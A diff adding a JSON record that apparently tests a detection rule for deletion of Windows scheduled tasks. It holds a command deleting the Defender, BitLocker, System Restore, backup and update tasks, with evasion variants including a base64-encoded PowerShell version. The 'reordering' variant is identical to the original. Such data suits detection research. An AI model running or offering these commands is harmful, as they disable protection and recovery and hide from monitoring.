@@ -1,0 +1,11 @@
+{
+  "rule_name": "proc_creation_win_schtasks_delete_0",
+  "original_command": "\\schtasks.exe /delete /tn \\Windows\\BitLocker \\Windows\\ExploitGuard \\Windows\\SystemRestore\\SR \\Windows\\UpdateOrchestrator\\ \\Windows\\Windows Defender\\ \\Windows\\WindowsBackup\\ \\Windows\\WindowsUpdate\\",
+  "evasions": {
+    "insertion": "\\schtasks.exe /delete /tn \\Windows\\BitLocker \\Windows\\ExploitGuard \\Windows\\SystemRestore\\SR \\Windows\\UpdateOrchestrator\\ \\Windows\\Windows Defender\\ \"\\Windows\\WindowsBackup\\\" \"\\Windows\\WindowsUpdate\\\"",
+    "substitution": "\\schtasks.exe -delete /tn \\Windows\\BitLocker \\Windows\\ExploitGuard \\Windows\\SystemRestore\\SR \\Windows\\UpdateOrchestrator\\ \\Windows\\Windows Defender\\ \\Windows\\WindowsBackup\\ \\Windows\\WindowsUpdate\\",
+    "omission": "\\schtasks /delete /tn \\Windows\\BitLocker \\Windows\\ExploitGuard \\Windows\\SystemRestore\\SR \\Windows\\UpdateOrchestrator\\ \\Windows\\Windows Defender\\ \\Windows\\WindowsBackup\\ \\Windows\\WindowsUpdate\\",
+    "reordering": "\\schtasks.exe /delete /tn \\Windows\\BitLocker \\Windows\\ExploitGuard \\Windows\\SystemRestore\\SR \\Windows\\UpdateOrchestrator\\ \\Windows\\Windows Defender\\ \\Windows\\WindowsBackup\\ \\Windows\\WindowsUpdate\\",
+    "recoding": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('XHNjaHRhc2tzLmV4ZSAvZGVsZXRlIC90biBcV2luZG93c1xCaXRMb2NrZXIgXFdpbmRvd3NcRXhwbG9pdEd1YXJkIFxXaW5kb3dzXFN5c3RlbVJlc3RvcmVcU1IgXFdpbmRvd3NcVXBkYXRlT3JjaGVzdHJhdG9yXCBcV2luZG93c1xXaW5kb3dzIERlZmVuZGVyXCBcV2luZG93c1xXaW5kb3dzQmFja3VwXCBcV2luZG93c1xXaW5kb3dzVXBkYXRlXA==')) | Invoke-Expression\" "
+  }
+}
